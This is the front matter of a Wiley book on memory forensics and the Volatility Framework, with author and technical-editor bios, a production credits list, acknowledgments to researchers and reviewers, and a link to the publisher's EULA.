**AAron Walters** ([@4tphi](http://www.twitter.com/4tphi)) is founder and lead developer of the Volatility Project, president of the Volatility Foundation, and chair of the Open Memory Forensics Workshop. AAron’s research led to groundbreaking developments that helped shape how digital investigators analyze RAM. He has published peer-reviewed papers in IEEE and Digital Investigation journals, and presented at Black Hat, DoD Cyber Crime Conference, and American Academy of Forensic Sciences.
# About the Technical Editors

**Golden G. Richard III** ([@nolaforensix](http://www.twitter.com/nolaforensix)) is currently Professor of Computer Science and Director of the Greater New Orleans Center for Information Assurance at the University of New Orleans. He also owns Arcane Alloy, LLC, a private digital forensics and computer security company.

**Nick L. Petroni, Jr., Ph.D.**, is a computer security researcher in the Washington, DC metro area. He has more than a decade of experience working on problems related to low-level systems security and memory forensics.
# Credits

**Executive Editor**

Carol Long

**Project Editor**

T-Squared Document Services

**Technical Editors**

Golden G. Richard III

Nick L. Petroni, Jr.

**Production Editor**

Christine Mugnolo

**Copy Editor**

Nancy Sixsmith

**Manager of Content Development and Assembly**

Mary Beth Wakefield

**Director of Community Marketing**

David Mayhew

**Marketing Manager**

Dave Allen

**Business Manager**

Amy Knies

**Vice President and Executive Group Publisher**

Richard Swadley

**Associate Publisher**

Jim Minatel

**Project Coordinator, Cover**

Patrick Redmond

**Compositor**

Maureen Forys, Happenstance Type-O-Rama

**Proofreaders**

Jennifer Bennett

Josh Chase

**Indexer**

Johnna VanHoose Dinse

**Cover Designer**

© iStock.com/Raycat

**Cover Image**

Wiley
# Acknowledgments

We would like to thank the memory forensics community at large: those who spend their weekends, nights, and holidays conducting research and creating free, open-source code for practitioners. This includes developers and users, both past and present, that have contributed unique ideas, plugins, and bug fixes to the Volatility Framework. Specifically, for their help on this book, we want to recognize the following:

- Dr. Nick L. Petroni for his invaluable comments during the book review process and whose innovative research inspired the creation of Volatility.
- Dr. Golden G. Richard III for his expertise and commitment as technical editor.
- Mike Auty for his endless hours helping to maintain and shepherd the Volatility source code repository.
- Bruce Dang and Brian Carrier for taking time out of their busy schedules to review our book.
- Brendan Dolan-Gavitt for his numerous contributions to Volatility and the memory forensics field that were highlighted in the book.
- George M. Garner, Jr. (GMG Systems, Inc.) for his insight and guidance in the memory acquisition realm.
- Matthieu Suiche (MoonSols) for reviewing the Windows Memory Toolkit section and for his advancements in Mac OS X and Windows Hibernation analysis.
- Matt Shannon (Agile Risk Management) for this review of the F-Response section of the book.
- Jack Crook for reviewing our book and for providing realistic forensics challenges that involve memory samples and allowing people to use them to become better analysts.
- Wyatt Roersma for providing memory samples from a range of diverse systems and for helping us test and debug issues.
- Andreas Schuster for discussions and ideas that helped shape many of the memory forensics topics and techniques.
- Robert Ghilduta, Lodovico Marziale, Joe Sylve, and Cris Neckar for their review of the Linux chapters and research discussions of the Linux kernel.
- Cem Gurkok for his Volatility plugins and research into Mac OS X.
- Dionysus Blazakis, Andrew F. Hay, Alex Radocea, and Pedro Vilaça for their help with the Mac OS X chapters, including providing memory captures, malware samples, research notes, and chapter reviews.

We also want to thank Maureen Tullis (T-Squared Document Services), Carol Long, and the various teams at Wiley that helped us through the authoring and publishing process.
# **WILEY END USER LICENSE AGREEMENT**

Go to [www.wiley.com/go/eula](http://www.wiley.com/go/eula) to access Wiley’s ebook EULA.
